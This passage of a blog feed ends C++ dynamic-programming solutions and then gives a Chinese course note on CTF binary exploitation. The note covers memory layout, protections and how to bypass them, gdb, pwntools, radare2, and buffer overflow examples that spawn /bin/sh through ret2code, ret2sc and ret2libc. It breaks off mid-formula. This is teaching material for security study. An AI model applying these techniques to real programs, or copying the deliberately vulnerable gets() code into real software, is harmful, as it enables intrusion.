punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>b<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">abs</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">abs</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>b<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="P-6-6-方格棋盤路線"><a href="#P-6-6-方格棋盤路線" class="headerlink" title="P-6-6. 方格棋盤路線"></a>P-6-6. 方格棋盤路線</h4><blockquote><p><a href="https://judge.tcirc.tw/ShowProblem?problemid=d069">https://judge.tcirc.tw/ShowProblem?problemid=d069</a> </p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> s<span class="token punctuation">[</span><span class="token number">205</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">205</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">205</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">205</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>m<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>m <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> j<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>m <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>m <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> j<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 Advanced CyberSecurity Day Note - PWN</title>
      <link href="/2021/08/29/Advanced-CyberSecurity-Day-Note-PWN/"/>
      <url>/2021/08/29/Advanced-CyberSecurity-Day-Note-PWN/</url>
      
        <content type="html"><![CDATA[<h2 id="PWN-Intro"><a href="#PWN-Intro" class="headerlink" title="PWN Intro"></a>PWN Intro</h2><h3 id="What-is-PWN"><a href="#What-is-PWN" class="headerlink" title="What is PWN?"></a>What is PWN?</h3><blockquote><p>控制程式流程進而觸發攻擊</p></blockquote><p>正常程式流程 Start -&gt; Input &lt;-&gt; Output -&gt; End</p><blockquote><p>Input：使用者輸入、操作<br>Output：反應 Input 所產生的動作(運算、輸出等)</p></blockquote><p>不正常的程式流程 Start -&gt; Input &lt;-&gt; Output -&gt; Segmentation Fault</p><h3 id="HOW-TO-PWN"><a href="#HOW-TO-PWN" class="headerlink" title="HOW TO PWN"></a>HOW TO PWN</h3><blockquote><p>尋找漏洞，進一步利用</p></blockquote><p>方法：</p><ol><li>Fuzz 模糊測試：自動產生隨機輸入來尋找漏洞</li><li>看原始碼、組合語言找漏洞</li></ol><p>目標：Start -&gt; Input &lt;-&gt; Output -&gt; Shell</p><h2 id="Program-Structure"><a href="#Program-Structure" class="headerlink" title="Program Structure"></a>Program Structure</h2><p><img src="https://i.imgur.com/MKf3HPC.png?60"></p><h3 id="Text-程式碼-Binary"><a href="#Text-程式碼-Binary" class="headerlink" title="Text - 程式碼 Binary"></a>Text - 程式碼 Binary</h3><p>r-x 可讀 不可寫 可執行</p><h3 id="Data-已初始化的全域變數"><a href="#Data-已初始化的全域變數" class="headerlink" title="Data - 已初始化的全域變數"></a>Data - 已初始化的全域變數</h3><p>Ex. 字串、數字</p><h3 id="BSS-未初始化的全域變數"><a href="#BSS-未初始化的全域變數" class="headerlink" title="BSS - 未初始化的全域變數"></a>BSS - 未初始化的全域變數</h3><h3 id="Heap-動態記憶體空間"><a href="#Heap-動態記憶體空間" class="headerlink" title="Heap - 動態記憶體空間"></a>Heap - 動態記憶體空間</h3><p><strong>從低位往高位長</strong></p><p>c 常用的 <code>malloc()</code>/<code>free()</code> 拿出來的空間來源為 Heap</p><h3 id="Stack-存放暫存資料"><a href="#Stack-存放暫存資料" class="headerlink" title="Stack - 存放暫存資料"></a>Stack - 存放暫存資料</h3><p>Stack：FILO 先進後出<br>暫存資料 Ex.區域變數、return address、參數、回傳值<br><strong>從高位往低位長</strong></p><p>stack top 存在 rop</p><blockquote><p>Stack 跟 Heap 不會碰到</p></blockquote><h4 id="區域變數-Local-Variable"><a href="#區域變數-Local-Variable" class="headerlink" title="區域變數 Local Variable"></a>區域變數 Local Variable</h4><p>先宣告的先存</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0x123</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">0x456</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p><img src="https://i.imgur.com/EeGYurz.png?80"><br>rsp 表示最低位<br>一個 block 8 個 byte</p><h4 id="Return-address"><a href="#Return-address" class="headerlink" title="Return address"></a>Return address</h4><p>Q：Call function 時，怎麼知道執行完要回到哪裡?<br>call function前，將 return address 存進 stack<br>return 時，回到 stack 中所存的位址</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://i.imgur.com/IACUySh.png?80"></p><p><code>process()</code>執行完後<code>...</code>會還原 ，跳過去<code>return address</code>指向的位置，接著 <code>pop</code>掉<code>return address</code></p><h2 id="Security-Options"><a href="#Security-Options" class="headerlink" title="Security Options"></a>Security Options</h2><p><code>checksec ./exe</code> 查看保護機制</p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELocation Read Only</p><div class="spoiler collapsed">    <div class="spoiler-title">        前行摘要-Lazy Binding    </div>    <div class="spoiler-content">        <p>Static linking 把所有的函式實作都包在一起<br>好處：執行方便<br>壞處：檔案太肥</p><p>Dynamic linking 的程式在執行過程中，有些 library 的函式到結束都不會執行到。</p><p>ELF 採取 Lazy binding 的機制，在<strong>第一次 call library 函式時，才會去尋找函式真正的位置進行 binding</strong></p><blockquote><p>實現 Lazy Binding<br>GOT &amp; PLT<br>GOT(Global Offset Table)：函式指標陣列，存了其他 library 中 function address。</p></blockquote><p>因為 Lazy binding 的機制，一開始只會填上一段 <code>.plt</code> 的 code</p><p>第一次執行時，<code>plt</code>會呼叫<code>_dl_fixup()</code>，才會去真正的 function 並填入 GOT。</p><p>第二次執行時，直接透過 GOT 找到 function address</p><p><img src="https://i.imgur.com/MXaUX2o.png?80"></p><ol><li>call <code>read()</code> </li><li>Read 的 GOT 先去 GOT 表查找有沒有已經存放 read address</li></ol><ul><li>沒有 -&gt; 進入 <code>resolve()</code> 來找<code>read()</code>真正的位址，然後記錄到 GOT 表，並 return 回 call read (執行)</li><li>有 -&gt; 直接 return 回 call read (執行)</li></ul>    </div></div><ul><li>No RELRO - link map 和 GOT 都可寫</li><li>Partial RELRO - link map 不可寫，GOT 可寫(可利用來PWN)</li><li>Full ReLRO - link map 和 GOT 都不可寫</li></ul><h3 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h3><p>stack 上的柵欄<br>在 rbp 之前塞一個 random 值，ret 之前檢查是否相同，不同的話就會<code>abort</code><br><img src="https://i.imgur.com/Nub9RNa.png?200x"><br>沒有 canary 的話，發生 buffer overflow 時就可以一直往下寫(return address等)<br>有 canary 的話，它發現後就會直接關掉程式<br><img src="https://i.imgur.com/ZCJ3KCP.png?80"></p><p>繞過</p><ul><li>想辦法事先取得 Canary 的值</li><li>只蓋掉 canary 前的值 / 直接蓋掉 canary 後的值</li></ul><h3 id="NX-No-eXecute"><a href="#NX-No-eXecute" class="headerlink" title="NX(No eXecute)"></a>NX(No eXecute)</h3><p>又稱 DEP(Data Execution Prevention)<br>可寫的不可執行，可執行的不可寫<br><img src="https://i.imgur.com/LmO0kk3.png?80"><br>可寫可執行很危險(把程式碼寫到這個空間，跳過去直接執行)</p><h3 id="PIE-Position-Independent-Executable"><a href="#PIE-Position-Independent-Executable" class="headerlink" title="PIE(Position Independent Executable)"></a>PIE(Position Independent Executable)</h3><p>開啟時， data 段以及 code 段位址隨機化<br>關閉時， data 段以及 code 段位址固定</p><p>攻擊時有時須跳到程式中的某個區段，PIE打開的話不能跳</p><h3 id="ASLR-Address-Space-Layout-Randomization"><a href="#ASLR-Address-Space-Layout-Randomization" class="headerlink" title="ASLR(Address Space Layout Randomization)"></a>ASLR(Address Space Layout Randomization)</h3><p>記憶體位址隨機化<br>每次執行時，stack、heap、library 位置都不一樣</p><blockquote><p>ASLR為系統設定，不是程式設定</p></blockquote><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><h3 id="nc-x2F-ncat"><a href="#nc-x2F-ncat" class="headerlink" title="nc/ncat"></a>nc/ncat</h3><p>pwn 題目常用的遠端連線工具<br>使用 ncat 將程式在遠端架起來，接著使用 nc 連線</p><pre class=" language-bash"><code class="language-bash">% ncat -vc <span class="token variable">$binary</span> -kl <span class="token variable">$ip</span> <span class="token variable">$port</span>% nc <span class="token variable">$ip</span> <span class="token variable">$port</span></code></pre><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p><code>% j *0x4896aa</code> 跳到某個位址(jmp)</p><p><code>% x/10gx 0x400686</code> 秀出某位址的值</p><p><code>% set $rax=0x5</code> 設定某個位址/暫存器的值</p><h3 id="checksec-查看程式的安全性保護"><a href="#checksec-查看程式的安全性保護" class="headerlink" title="checksec 查看程式的安全性保護"></a>checksec 查看程式的安全性保護</h3><p><code>%checksec $library</code><br><img src="https://i.imgur.com/f0gtvqq.png?80"></p><h3 id="gdb-vmmap"><a href="#gdb-vmmap" class="headerlink" title="gdb - vmmap"></a>gdb - vmmap</h3><p>查看目前程式的記憶體分布、rwn 權限設定<br><code>% vmmap</code></p><pre class=" language-bash"><code class="language-bash">b main <span class="token punctuation">(</span>breakpoint<span class="token punctuation">)</span>rvmmap</code></pre><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>用來和遠端程式互動的 python 套件</p><pre class=" language-bash"><code class="language-bash">% pip <span class="token function">install</span> pwntools</code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># connect to server(二擇一)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./add'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># localhost binary 本地端程式</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'140.113.0.3'</span> <span class="token punctuation">,</span> <span class="token number">8080</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># remote binary(IP,port) 遠端程式</span>s <span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># receive from binary until ':'</span><span class="token keyword">print</span> <span class="token string">'1: '</span> <span class="token operator">+</span> ss <span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'$'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'$'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#辨識 s 取到那些</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3 5'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># send to server (相當於在鍵盤上打 3 5 )</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># switch to interation mode</span></code></pre><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><p>分析 elf / binary 的工具<br><code>% readelf -a $libc | less</code></p><p><code>% readelf -a $libc | grep 'printf'</code> 找出所有有<code>printf</code>的function</p><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>列出 binary 中可以使用的 ROP gadget<br><code>% ROPgadget --binary $ binary</code></p><h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><p>動態、靜態分析都可以⽤的⼯具<br><a href="https://frozenkp.github.io/reverse/radare2/">講師的使用教學</a></p><pre class=" language-bash"><code class="language-bash">% <span class="token function">git</span> clone https://github.com/radare/radare2.git% <span class="token function">sudo</span> ./radare2/sys/install.sh</code></pre><p><code>% r2 $binary </code></p><pre class=" language-bash"><code class="language-bash">q <span class="token comment" spellcheck="true"># 退出</span>? <span class="token comment" spellcheck="true"># 顯示指令</span>p? <span class="token comment" spellcheck="true"># 顯示 p 開頭的指令</span>aa <span class="token comment" spellcheck="true">#分析</span>afl <span class="token comment" spellcheck="true"># 列出所有 function</span>afn <span class="token variable">$new_name</span> <span class="token variable">$old_name</span> <span class="token comment" spellcheck="true">#修改 function 名</span>afvn <span class="token variable">$new_name</span> <span class="token variable">$old_name</span> <span class="token comment" spellcheck="true">#修改區域變數名</span>s <span class="token variable">$function_name</span> <span class="token comment" spellcheck="true">#移動到其他位置</span><span class="token comment" spellcheck="true">#Ex. s main</span>s <span class="token variable">$address</span> <span class="token comment" spellcheck="true">#移動到其他位置</span><span class="token comment" spellcheck="true">#Ex. s 0x0000610</span>pd <span class="token variable">$n_line</span> <span class="token comment" spellcheck="true">#印出從現在位置開始 n 行的 asm</span>pdf <span class="token comment" spellcheck="true"># 印出現在位置的整個 function 內容</span></code></pre><p>Mode</p><ul><li>CLI Mode</li><li>Hex Mode</li><li>Visual Mode<br><img src="https://i.imgur.com/UNorzos.png" alt="switch"></li></ul><hr><h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><ul><li>輸入時沒有控制輸入長度，導致記憶體空間被輸入覆蓋掉</li><li>通常發⽣在 char 陣列 (字串) 的輸入</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Input</span>    <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Output</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>compile and execute</p><pre class=" language-bash"><code class="language-bash">% gcc test.c -fno-stack-protector -o <span class="token function">test</span>% ./testhellohello</code></pre><p>Q：若輸入很大字串?</p><pre class=" language-bash"><code class="language-bash">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre><p><img src="https://i.imgur.com/KWnvPO7.png?80"><br><img src="https://i.imgur.com/4hB4Ihj.png?80"></p><h3 id="輸入：gets-x2F-read"><a href="#輸入：gets-x2F-read" class="headerlink" title="輸入：gets / read"></a>輸入：gets / read</h3><ol><li>gets 沒有限制輸入長度<pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>read 有限制最大輸入長度，可 overflow ⼤⼩為最⼤輸入長度與 buffer 長度之間<pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//只能 overflow 8 bytes(最大長度16-buffer長度8)</span> <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ol><h3 id="應用"><a href="#應用" class="headerlink" title="應用"></a>應用</h3><p>stack 上</p><ul><li>local variable</li><li>saved rbp -&gt; stack migration</li><li>return address -&gt; ret2 series</li></ul><h3 id="local-variable"><a href="#local-variable" class="headerlink" title="local variable"></a>local variable</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span>“<span class="token operator">/</span>bin<span class="token operator">/</span>sh”<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>計算 offset (從開始寫的位置到目標位置間的長度)</p><ul><li>先隨意輸入來確定 buffer 位置</li><li>計算 buffer 位置和⽬標位置距離多遠<br><img src="https://i.imgur.com/EbmFcCW.png"><br>0x7fffffffe7a8：buffer 位置<br>0x7fffffffe798：目標位置<br><code>offset = 0x7fffffffe7a8 - 0x7fffffffe798 = 0x10</code></li></ul><a href="/2021/08/29/MyFirstPWN-%E5%BC%B5%E5%85%83-Pwn-1-luck-write-up/" title="[題目]Luck write-up">[題目]Luck write-up</a><h3 id="ret2code"><a href="#ret2code" class="headerlink" title="ret2code"></a>ret2code</h3><p>透過 Buffer Overflow 改變 return address<br>將 return address 改到 code 中任意處</p><blockquote><p>須關閉 PIE</p></blockquote><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span>“<span class="token operator">/</span>bin<span class="token operator">/</span>sh”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>把 return address 覆蓋成 shell 的 address<br><img src="https://i.imgur.com/buf8nSQ.png?80"></p><p>找 shell 的 address</p><ul><li>shell：<code>% objdump -M intel -d test | less</code></li><li>gdb：<code>gdb-peda$ p shell</code></li><li>r2：<code>[0x000005d0]&gt; afl~shell</code> (<code>~</code>-&gt;grep)</li></ul><h3 id="ret2sc"><a href="#ret2sc" class="headerlink" title="ret2sc"></a>ret2sc</h3><ul><li>透過 Buffer Overflow 改變 return address</li><li>將 return address 改到 <strong>⾃⼰寫的 shell code</strong> 處並執⾏<blockquote><p>須關閉 NX</p></blockquote></li></ul><p><img src="https://i.imgur.com/KcgnGYF.png?80"></p><p>寫 shell code</p><ul><li>選有 <strong>rwx</strong> 處</li><li>選中間部分 (前後可能有其他用處)</li></ul><p>Problem</p><ul><li>漏洞沒利用好</li><li>寫的地方蓋到重要東西</li><li>shell code 寫壞</li></ul><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="GOT-Hikcaking"><a href="#GOT-Hikcaking" class="headerlink" title="GOT Hikcaking"></a>GOT Hikcaking</h4><p>透過改寫 GOT 使得呼叫該函式時，跳到指定位置</p><blockquote><p>不能是 Full RELRO (GOT 不能動)</p></blockquote><p>把 <code>puts libc</code>的地方覆蓋成我們要的<br><img src="https://i.imgur.com/pmKRFIo.png"></p><h4 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>通常 libc 中的函式並不會全部⽤到，但其中包含許多好⽤的函式(Ex.<code>system()</code>,<code>execve()</code>)</p><p>因為 ASLR，libc 的位址會有 libc base(隨機值)，必須有 libc base 才可以使⽤ libc 函式</p><h4 id="libc-base-在哪"><a href="#libc-base-在哪" class="headerlink" title="libc base 在哪?"></a>libc base 在哪?</h4><p>因為是隨機值，每次都不一樣，只能在執行過程中 leak 出來<br>尋找執⾏中有⽤到 libc 的位址</p><ul><li>GOT 的內容</li><li>stack 上的殘渣</li></ul><h4 id="libc-base-計算"><a href="#libc-base-計算" class="headerlink" title="libc base 計算"></a>libc base 計算</h4><pre class=" language-bash"><code class="language-bash">puts_got_value <span class="token operator">=</span> libc_base + 